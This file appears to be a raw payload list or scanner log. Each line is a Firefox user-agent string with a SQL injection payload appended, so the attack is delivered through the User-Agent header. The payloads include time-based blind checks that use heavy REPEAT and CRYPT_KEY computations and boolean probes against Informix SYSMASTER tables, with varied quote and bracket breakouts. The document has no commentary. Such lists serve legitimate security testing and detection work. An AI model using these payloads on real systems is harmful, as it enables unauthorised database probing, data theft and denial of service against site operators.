Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (((\x22ezuo\x22 LIKE \x22ezuo
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHAR(89)||CHAR(82)||CHAR(70)||CHAR(110) WHERE 8572=8572 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS yhSI WHERE 1275=1275 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- DMQX
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- SNyL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (((3629=3629
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((('YAug'='YAug
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND 'QRCH'='QRCH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (('WKzD' LIKE 'WKzD
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (\x22azbB\x22=\x22azbB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((\x22hzYu\x22=\x22hzYu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((\x22DdjH\x22 LIKE \x22DdjH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 4257=4257 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- ZGkt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 9822=9822 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- PpTv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 5810=5810 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- qfvW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(106)||CHAR(105)||CHAR(109)||CHAR(87) FROM DUAL WHERE 4974=4974 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT iYSG WHERE 6819=6819 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHAR(108)||CHAR(119)||CHAR(73)||CHAR(85) WHERE 1191=1191 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS MstS WHERE 6611=6611 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- XrgT
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS zrSp WHERE 2248=2248 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- YBFr
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS ycaS WHERE 2346=2346 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- BXfZ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS dGKR WHERE 1552=1552 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- fENY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 3440=3440 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(112)||CHAR(85)||CHAR(116)||CHAR(116) WHERE 1686=1686 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(88)||CHAR(88)||CHAR(78)||CHAR(67) FROM DUAL WHERE 1597=1597 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHAR(106)||CHAR(84)||CHAR(78)||CHAR(107) WHERE 3640=3640 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(71)||CHAR(90)||CHAR(85)||CHAR(100) WHERE 4225=4225 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS UWzt WHERE 3258=3258 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS woNn WHERE 7597=7597 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 5401=5401 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 4035=4035 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 8845=8845 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 1966=1966 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 5623=5623 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(75)||CHAR(106)||CHAR(97)||CHAR(104) WHERE 6941=6941 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(67)||CHAR(79)||CHAR(104)||CHAR(86) FROM DUAL WHERE 6426=6426 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(78)||CHAR(78)||CHAR(78)||CHAR(114) FROM DUAL WHERE 6353=6353 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT jWFS WHERE 5126=5126 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS CzLJ WHERE 6106=6106 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS RtXH WHERE 2193=2193 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS mFif WHERE 3978=3978 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- JmWN
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- AEAG
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (('aPPL'='aPPL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('ZLYM' LIKE 'ZLYM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (\x22frDX\x22=\x22frDX
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (\x22LewP\x22 LIKE \x22LewP
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND \x22NBYw\x22 LIKE \x22NBYw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) OR 'TRWX'='mZUY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 9750=9750 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- QFJb
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 7290=7290 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- yJGP
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT kLYq WHERE 1845=1845 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT KjfU WHERE 8167=8167 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS RdSU WHERE 9645=9645 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- CWeB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS TPaF WHERE 6051=6051 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- nQrq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 3562=3562 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- SSxz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (6418=6418
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((1218=1218
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ('lXJu' LIKE 'lXJu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((('poVY' LIKE 'poVY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND 'gPIH' LIKE 'gPIH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((\x22vygL\x22=\x22vygL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (((\x22dLKm\x22=\x22dLKm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (\x22VINs\x22 LIKE \x22VINs
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- giGA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) OR 'XOPk'='ecqr
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 6036=6036 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- ziQt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT sWmv WHERE 7745=7745 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS IMAb WHERE 5946=5946 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- xoUF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS ylIo WHERE 2461=2461 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- gKiI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS QWYK WHERE 2830=2830 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- ScAg
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 3623=3623 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 4043=4043 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT sSBN WHERE 3786=3786 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT OPHt WHERE 6549=6549 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS zvOx WHERE 3223=3223 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS tgtP WHERE 6936=6936 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS SBLn WHERE 2491=2491 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 3916=3916 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 1997=1997 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 3686=3686 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- ezJt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHAR(79)||CHAR(78)||CHAR(100)||CHAR(81) WHERE 3157=3157 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(106)||CHAR(74)||CHAR(80)||CHAR(87) FROM DUAL WHERE 1367=1367 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||
